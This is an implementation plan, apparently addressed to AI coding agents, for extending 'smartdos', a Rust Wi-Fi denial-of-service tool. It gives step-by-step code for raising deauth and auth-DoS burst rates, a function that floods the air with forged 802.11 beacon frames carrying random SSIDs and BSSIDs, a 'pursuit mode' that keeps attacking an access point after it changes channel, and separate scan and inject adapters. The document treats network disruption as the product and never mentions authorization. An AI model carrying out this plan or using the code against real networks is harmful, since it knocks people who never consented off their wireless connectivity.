# smartdos Feature Expansion Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Implement 6 missing DoS/pentest features: burst size control, file logging, persistent targets, beacon flood attack, pursuit mode, and multi-interface support. Handshake/PMKID capture are explicitly out of scope (this tool is DoS-only). WPS also out of scope.

**Architecture:** Features fall into two tiers — UI/state additions (burst, logging, persistence), new attack types (beacon flood), and cross-thread coordination (pursuit mode, multi-interface). Each feature is self-contained; implement in order. `serde`, `serde_json`, `rand`, `chrono` are already in `Cargo.toml`.

**Tech Stack:** Rust, pcap, ratatui, crossterm, serde_json, chrono, rand. Linux-only for pcap features; non-Linux stubs already in place with `#[cfg(target_os = "linux")]`.

---

## File Map

| File | Changes |
|---|---|
| `src/types.rs` | Add `burst_size`, `pursuit_mode`, `log_file`, `AttackType::BeaconFlood`, `AttackCommand::UpdateTargetChannel` |
| `src/attack.rs` | Replace hardcoded `burst_size`, add `BeaconFlood` branch + `send_beacon_flood_frame`, handle `UpdateTargetChannel` |
| `src/app.rs` | Pass burst_size; pursuit mode logic; file log init; add toggle fns |
| `src/scanner.rs` | No changes (pursuit mode handled in app.rs via existing `ApUpdated` event) |
| `src/ui.rs` | Show burst size, pursuit mode, scan/inject iface labels |
| `src/main.rs` | `[`/`]` burst; `P` pursuit; second CLI arg for inject iface; persist save calls |
| `src/persist.rs` | New — save/load targets to `~/.smartdos/targets.json` |

---

## Task 1: Burst Size Control

**Files:**
- Modify: `src/types.rs` (App struct)
- Modify: `src/attack.rs` (start_attack signature + both stubs)
- Modify: `src/app.rs` (pass burst_size, add increase/decrease fns)
- Modify: `src/ui.rs` (show burst in controls)
- Modify: `src/main.rs` (`[` / `]` keys)

- [ ] **Step 1: Add `burst_size` to App**

In `src/types.rs`, add field to `App` struct after `attack_type`:
```rust
pub burst_size: u8,
```
In `App::new()`, add to the struct literal:
```rust
burst_size: 5,
```

- [ ] **Step 2: Add `burst_size` param to `start_attack` (both Linux + stub)**

In `src/attack.rs`, change Linux `start_attack` signature:
```rust
pub fn start_attack(
    mon_iface: &str,
    targets: Vec<Target>,
    mode: AttackMode,
    attack_type: AttackType,
    burst_size: u8,
    attack_tx: mpsc::Sender<AttackEvent>,
    cmd_rx: mpsc::Receiver<AttackCommand>,
    running: Arc<AtomicBool>,
) -> Result<std::thread::JoinHandle<()>>
```
Inside the spawn closure, replace the hardcoded `let burst_size = 5;` with:
```rust
let burst_size = burst_size as usize;
```
Do the same for the `#[cfg(not(target_os = "linux"))]` stub — add `burst_size: u8` param and replace hardcoded `let burst_size: u64 = 5;` with `let burst_size = burst_size as u64;`.

- [ ] **Step 3: Pass burst_size from app.rs**

In `src/app.rs`, in `start_attack`:
```rust
let burst_size = app.burst_size;
// ...
match attack::start_attack(&mon_iface, targets, mode, attack_type, burst_size, attack_tx, cmd_rx, running) {
```
Add two new public fns at bottom of file:
```rust
pub fn increase_burst_size(app: &mut App) {
    if app.burst_size < 50 {
        app.burst_size += 1;
        app.add_log(format!("Burst size: {}", app.burst_size));
    }
}

pub fn decrease_burst_size(app: &mut App) {
    if app.burst_size > 1 {
        app.burst_size -= 1;
        app.add_log(format!("Burst size: {}", app.burst_size));
    }
}
```

- [ ] **Step 4: Show burst size in UI**

In `src/ui.rs`, in `render_logs` (attack controls section), add a line after `mode_txt`:
```rust
let burst_txt = format!("Burst: {}/target", app.burst_size);
```
Add to `ctrl_text` vec after mode line:
```rust
Line::from(Span::styled(burst_txt, Style::default().fg(Color::White))),
```

- [ ] **Step 5: Add key bindings**

In `src/main.rs`, in `handle_key_event`, add before the `'m'` arm:
```rust
KeyCode::Char('[') => {
    app::decrease_burst_size(app);
}
KeyCode::Char(']') => {
    app::increase_burst_size(app);
}
```
In footer hint in `src/ui.rs`, add:
```rust
add(&mut spans, "[]", "burst");
```

- [ ] **Step 6: Verify**
```bash
cargo check 2>&1 | grep -E "^error"
```
Expected: no errors.

- [ ] **Step 7: Commit**
```bash
git add src/types.rs src/attack.rs src/app.rs src/ui.rs src/main.rs
git commit -m "feat: configurable burst size with [ ] keys (default 5, max 50)"
```

---

## Task 2: File Logging

**Files:**
- Modify: `src/types.rs` (App struct — add `log_file` field, update `add_log`)
- Modify: `src/app.rs` (add `init_log_file`)
- Modify: `src/main.rs` (call `init_log_file`)

- [ ] **Step 1: Add log_file to App**

In `src/types.rs`, add imports at top:
```rust
use std::fs::File;
use std::io::Write;
```
Add field to `App` struct:
```rust
pub log_file: Option<File>,
```
In `App::new()` add:
```rust
log_file: None,
```

- [ ] **Step 2: Write to log file in add_log**

In `src/types.rs`, replace `add_log` with:
```rust
pub fn add_log(&mut self, msg: String) {
    self.log_messages.push(msg.clone());
    if self.log_messages.len() > 100 {
        self.log_messages.remove(0);
    }
    if let Some(ref mut f) = self.log_file {
        let ts = chrono::Local::now().format("%H:%M:%S");
        let _ = writeln!(f, "[{}] {}", ts, msg);
    }
}
```

- [ ] **Step 3: Add init_log_file to app.rs**

In `src/app.rs`, add at top: `use std::fs::OpenOptions;` and add function:
```rust
pub fn init_log_file(app: &mut App) {
    let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".into());
    let dir = std::path::PathBuf::from(home).join(".smartdos");
    let _ = std::fs::create_dir_all(&dir);
    let path = dir.join("session.log");
    match OpenOptions::new().create(true).append(true).open(&path) {
        Ok(f) => {
            app.log_file = Some(f);
            app.add_log(format!("Logging to {}", path.display()));
        }
        Err(e) => {
            app.add_log(format!("Log file open failed: {}", e));
        }
    }
}
```

- [ ] **Step 4: Call init_log_file from main**

In `src/main.rs`, after the `app.add_log(...)` initialization lines, add:
```rust
app::init_log_file(&mut app);
```

- [ ] **Step 5: Verify**
```bash
cargo check 2>&1 | grep -E "^error"
```

- [ ] **Step 6: Commit**
```bash
git add src/types.rs src/app.rs src/main.rs
git commit -m "feat: file logging to ~/.smartdos/session.log with timestamps"
```

---

## Task 3: Persistent Targets

**Files:**
- Create: `src/persist.rs`
- Modify: `src/main.rs` (register module, load on startup, save on change)

- [ ] **Step 1: Create persist.rs**

Create `src/persist.rs`:
```rust
use anyhow::Result;
use serde::{Deserialize, Serialize};
use std::path::PathBuf;

use crate::types::Target;

#[derive(Serialize, Deserialize)]
struct SavedTarget {
    bssid: String,
    ssid: String,
    channel: u8,
}

fn targets_path() -> PathBuf {
    let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".into());
    PathBuf::from(home).join(".smartdos").join("targets.json")
}

pub fn save_targets(targets: &[Target]) -> Result<()> {
    let path = targets_path();
    let _ = std::fs::create_dir_all(path.parent().unwrap());
    let saved: Vec<SavedTarget> = targets
        .iter()
        .map(|t| SavedTarget {
            bssid: t.bssid.clone(),
            ssid: t.ssid.clone(),
            channel: t.channel,
        })
        .collect();
    let json = serde_json::to_string_pretty(&saved)?;
    std::fs::write(&path, json)?;
    Ok(())
}

pub fn load_targets() -> Vec<Target> {
    let path = targets_path();
    let data = match std::fs::read_to_string(&path) {
        Ok(d) => d,
        Err(_) => return Vec::new(),
    };
    let saved: Vec<SavedTarget> = match serde_json::from_str(&data) {
        Ok(v) => v,
        Err(_) => return Vec::new(),
    };
    saved
        .into_iter()
        .map(|s| Target {
            bssid: s.bssid,
            ssid: s.ssid,
            channel: s.channel,
            active: true,
            deauth_count: 0,
        })
        .collect()
}
```

- [ ] **Step 2: Register module and load on startup**

In `src/main.rs`, add `mod persist;` at top. After `App::new()` and before scanner init:
```rust
let loaded = persist::load_targets();
if !loaded.is_empty() {
    let count = loaded.len();
    app.targets = loaded;
    app.add_log(format!("Loaded {} persisted targets", count));
}
```

- [ ] **Step 3: Save on target change**

In `src/main.rs`, in the `KeyCode::Char('t')` handler, after `app.toggle_target(...)`:
```rust
let _ = persist::save_targets(&app.targets);
```
In the `KeyCode::Char('d')` handler, after `app.remove_target(...)` or `app.toggle_target(...)`:
```rust
let _ = persist::save_targets(&app.targets);
```

- [ ] **Step 4: Verify**
```bash
cargo check 2>&1 | grep -E "^error"
```

- [ ] **Step 5: Commit**
```bash
git add src/persist.rs src/main.rs
git commit -m "feat: persist targets to ~/.smartdos/targets.json, reload on startup"
```

---

## Task 4: Beacon Flood Attack

**Files:**
- Modify: `src/types.rs` (AttackType::BeaconFlood)
- Modify: `src/attack.rs` (Linux: send_beacon_flood_frame; wire into burst loops)
- Modify: `src/ui.rs` (label color)

- [ ] **Step 1: Add BeaconFlood variant**

In `src/types.rs`, in `AttackType`:
```rust
pub enum AttackType {
    Deauth,
    AuthDos,
    BeaconFlood,
}
```
Update `toggle`:
```rust
pub fn toggle(&self) -> Self {
    match self {
        AttackType::Deauth => AttackType::AuthDos,
        AttackType::AuthDos => AttackType::BeaconFlood,
        AttackType::BeaconFlood => AttackType::Deauth,
    }
}
```
Update `label`:
```rust
pub fn label(&self) -> &'static str {
    match self {
        AttackType::Deauth => "Deauth",
        AttackType::AuthDos => "AuthDos",
        AttackType::BeaconFlood => "BeaconFlood",
    }
}
```

- [ ] **Step 2: Add send_beacon_flood_frame (Linux)**

In `src/attack.rs`, after `send_auth_dos_frame`, add:
```rust
/// Flood airspace with fake beacon frames — random SSIDs and BSSIDs
#[cfg(target_os = "linux")]
fn send_beacon_flood_frame(cap: &mut pcap::Capture<pcap::Active>, channel: u8) {
    use rand::Rng;
    let mut rng = rand::thread_rng();

    static mut SEQ: u16 = 0;
    let seq = unsafe {
        SEQ = SEQ.wrapping_add(1);
        SEQ
    };

    let fake_bssid: [u8; 6] = [
        0x02 | (rng.gen::<u8>() & 0xFE),
        rng.gen(), rng.gen(), rng.gen(), rng.gen(), rng.gen(),
    ];

    let ssid_len = rng.gen_range(6..=12usize);
    let ssid: Vec<u8> = (0..ssid_len).map(|_| rng.gen_range(0x41u8..=0x5Au8)).collect();

    let frame_control: u16 = 0x0080; // mgmt subtype 8 (beacon)
    let broadcast = [0xFFu8; 6];

    let mut frame = Vec::with_capacity(60);
    frame.extend_from_slice(&frame_control.to_le_bytes());
    frame.extend_from_slice(&0x0000u16.to_le_bytes()); // duration
    frame.extend_from_slice(&broadcast);
    frame.extend_from_slice(&fake_bssid);
    frame.extend_from_slice(&fake_bssid);
    frame.extend_from_slice(&seq.to_le_bytes());
    frame.extend_from_slice(&[0u8; 8]);         // timestamp
    frame.extend_from_slice(&[0x64, 0x00]);     // beacon interval
    frame.extend_from_slice(&[0x01, 0x04]);     // capability: ESS
    frame.push(0x00); frame.push(ssid_len as u8); frame.extend_from_slice(&ssid);
    frame.extend_from_slice(&[0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24]);
    frame.extend_from_slice(&[0x03, 0x01, channel]);

    let mut packet = Vec::with_capacity(8 + frame.len());
    packet.extend_from_slice(&build_radiotap_header());
    packet.extend_from_slice(&frame);
    let _ = cap.sendpacket(&*packet);
}
```

- [ ] **Step 3: Wire BeaconFlood into burst loops**

In both RoundRobin and Parallel burst loops in the Linux `start_attack`, add arm to `match attack_type`:
```rust
AttackType::BeaconFlood => {
    send_beacon_flood_frame(&mut sender, ch);
}
```
Where `ch` = `target_states[idx].channel` (already bound in RoundRobin as `let ch = ...`; use inline in Parallel).

The non-Linux stub already handles all `AttackType` variants generically (no match on attack_type) — no changes needed.

- [ ] **Step 4: Update UI color**

In `src/ui.rs`, update `type_txt` color:
```rust
Style::default().fg(if app.attack_type == AttackType::AuthDos || app.attack_type == AttackType::BeaconFlood {
    Color::Magenta
} else {
    Color::Cyan
}),
```

- [ ] **Step 5: Verify**
```bash
cargo check 2>&1 | grep -E "^error"
```

- [ ] **Step 6: Commit**
```bash
git add src/types.rs src/attack.rs src/ui.rs
git commit -m "feat: beacon flood attack — random SSIDs/BSSIDs, cycle via A key"
```

---

## Task 5: Pursuit Mode

When enabled + attack running, if a target AP's channel changes (detected via beacon), attack thread re-tunes immediately.

**Files:**
- Modify: `src/types.rs` (App.pursuit_mode, AttackCommand::UpdateTargetChannel)
- Modify: `src/attack.rs` (handle new command in both impls)
- Modify: `src/app.rs` (detect channel change, add toggle)
- Modify: `src/ui.rs` (show pursuit status)
- Modify: `src/main.rs` (`P` key)

- [ ] **Step 1: Add to types.rs**

Add `pursuit_mode: bool` to `App` struct, init to `false`.

Add `UpdateTargetChannel` to `AttackCommand`:
```rust
pub enum AttackCommand {
    UpdateTargets(Vec<Target>),
    UpdateScope(DeauthScope),
    UpdateTargetChannel { bssid: String, channel: u8 },
}
```

- [ ] **Step 2: Handle UpdateTargetChannel in attack thread (Linux)**

In both command drain loops (RoundRobin and Parallel) in `src/attack.rs`:
```rust
AttackCommand::UpdateTargetChannel { bssid, channel } => {
    if let Some(state) = target_states.iter_mut().find(|s| s.bssid == bssid) {
        state.channel = channel;
        let _ = attack_tx.send(AttackEvent::Error(format!(
            "Pursuit: {} → ch {}", bssid, channel
        )));
    }
}
```

In non-Linux stub command drain:
```rust
AttackCommand::UpdateTargetChannel { bssid, channel } => {
    let _ = attack_tx.send(AttackEvent::Error(format!(
        "[STUB] Pursuit: {} → ch {}", bssid, channel
    )));
}
```

- [ ] **Step 3: Detect channel change in app.rs**

In `process_scanner_events`, in `ScannerEvent::ApUpdated(ap)` arm, after the existing update block, add:
```rust
if app.pursuit_mode && app.attack_running {
    let new_ch = ap.channel;
    let bssid = ap.bssid.clone();
    if let Some(target) = app.targets.iter_mut().find(|t| t.bssid == bssid) {
        if target.channel != new_ch && new_ch > 0 {
            target.channel = new_ch;
            if let Some(ref tx) = app.attack_cmd_tx {
                let _ = tx.send(AttackCommand::UpdateTargetChannel {
                    bssid,
                    channel: new_ch,
                });
            }
        }
    }
}
```
Also ensure `existing.channel = ap.channel;` is in the ApUpdated update block (add it if absent).

- [ ] **Step 4: Add toggle_pursuit_mode**

```rust
pub fn toggle_pursuit_mode(app: &mut App) {
    app.pursuit_mode = !app.pursuit_mode;
    app.add_log(format!("Pursuit mode: {}", if app.pursuit_mode { "ON" } else { "OFF" }));
}
```

- [ ] **Step 5: P key in main.rs**

```rust
KeyCode::Char('p') | KeyCode::Char('P') => {
    app::toggle_pursuit_mode(app);
}
```

- [ ] **Step 6: Show in UI**

In `render_logs` controls, add to `ctrl_text`:
```rust
Line::from(Span::styled(
    format!("Pursuit: {}", if app.pursuit_mode { "ON" } else { "off" }),
    Style::default().fg(if app.pursuit_mode { Color::Yellow } else { Color::DarkGray }),
)),
```
Add `P:pursuit` to footer.

- [ ] **Step 7: Verify**
```bash
cargo check 2>&1 | grep -E "^error"
```

- [ ] **Step 8: Commit**
```bash
git add src/types.rs src/attack.rs src/app.rs src/ui.rs src/main.rs
git commit -m "feat: pursuit mode — attack follows AP channel hops in real time"
```

---

## Task 6: Multi-Interface Support

Separate scan NIC from inject NIC. Note: linter has already added `listen_interface` and `attack_interface` fields to `App` in `types.rs`, and `ui.rs` already renders them. Focus is on CLI parsing and `init_scanner` routing.

**Files:**
- Modify: `src/main.rs` (parse second CLI arg, set listen_interface + attack_interface)
- Modify: `src/app.rs` (init_scanner uses listen_interface)

- [ ] **Step 1: Parse second CLI arg in main.rs**

Replace the `let wireless_iface = if args.len() > 1 { ... }` block with:
```rust
let (scan_iface_raw, inject_iface_raw) = if args.len() > 2 {
    (args[1].clone(), Some(args[2].clone()))
} else if args.len() > 1 {
    (args[1].clone(), None)
} else {
    let ifaces = interface::discover_interfaces()?;
    if ifaces.is_empty() {
        eprintln!("No wireless interfaces found.");
        std::process::exit(1);
    }
    if ifaces.len() == 1 { (ifaces[0].name.clone(), None) }
    else {
        eprintln!("Multiple interfaces. Usage: smartdos <scan_iface> [inject_iface]");
        for i in &ifaces { eprintln!("  {}", i.name); }
        std::process::exit(1);
    }
};
```

- [ ] **Step 2: Enable monitor mode for both ifaces**

```rust
let scan_mon = if scan_iface_raw.ends_with("mon") {
    scan_iface_raw.clone()
} else {
    interface::enable_monitor_mode(&scan_iface_raw).unwrap_or_else(|e| {
        eprintln!("Monitor mode failed on scan iface: {}", e);
        std::process::exit(1);
    })
};

let inject_mon = match inject_iface_raw {
    Some(ref raw) => {
        if raw.ends_with("mon") { raw.clone() }
        else {
            interface::enable_monitor_mode(raw).unwrap_or_else(|e| {
                eprintln!("Monitor mode failed on inject iface: {}", e);
                std::process::exit(1);
            })
        }
    }
    None => scan_mon.clone(),
};

app.listen_interface = Some(scan_mon.clone());
app.attack_interface = Some(inject_mon.clone());
app.monitor_interface = Some(inject_mon.clone()); // backwards compat
```

Replace the existing `let mon_iface = { ... }` block with the above. Update all downstream references to `mon_iface` → use `scan_mon` for scanner init and `inject_mon` for the attack.

- [ ] **Step 3: Use listen_interface in init_scanner**

In `src/app.rs`, in `init_scanner`, no signature change needed. At call site in `main.rs`, pass `&scan_mon` to `app::init_scanner`.

- [ ] **Step 4: Verify**
```bash
cargo check 2>&1 | grep -E "^error"
```

- [ ] **Step 5: Commit**
```bash
git add src/main.rs src/app.rs
git commit -m "feat: multi-interface — separate scan and inject adapters via CLI"
```

---

## Task 7: Update COMPARISON.md

**Files:**
- Modify: `COMPARISON.md`

- [ ] **Step 1: Mark implemented features**

Update roadmap table rows to `✓`:
- 5GHz, Auth DoS, Beacon Flood, Burst control, File logging, Persistent targets, Pursuit mode, Multi-interface

- [ ] **Step 2: Update out-of-scope section**

```markdown
### Out of scope for smartdos (by design)

- WPS attacks — subprocess reaver/bully/pixiewps; outside DoS scope
- Handshake capture / WPA cracking — DoS-only tool, not credential theft
- PMKID capture — same reason
- Evil twin / captive portal (hostapd + dhcpd + webserver)
- WEP attacks (legacy, besside-ng dependency)
- WPA3 downgrade (complex protocol handling)
- Enterprise 802.1X attacks
```

- [ ] **Step 3: Commit**
```bash
git add COMPARISON.md
git commit -m "docs: mark implemented features, note out-of-scope items"
```

---

## Final Verification

- [ ] Full release build:
```bash
cargo build --release 2>&1 | grep -E "^error"
```
Expected: 0 errors.
